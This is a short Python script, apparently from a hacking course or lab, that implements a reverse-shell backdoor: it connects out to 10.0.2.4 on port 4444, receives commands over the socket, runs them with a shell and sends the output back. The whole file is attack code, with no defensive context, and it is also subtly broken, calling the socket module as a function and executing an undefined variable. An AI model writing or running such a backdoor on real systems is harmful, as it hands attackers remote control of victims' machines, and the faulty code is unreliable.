#!/usr/bin/env python

import socket, subprocess


def execute_system_command(command):
	return subprocess.check_output(command, shell=True)

connection = socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("10.0.2.4", 4444))

connection.send("\n[+] Connection established.\n")


while True:
	command = connection.recv(1024)
	command_result = execute_system_command(received_data)
	connection.send(command_result)


connection.close()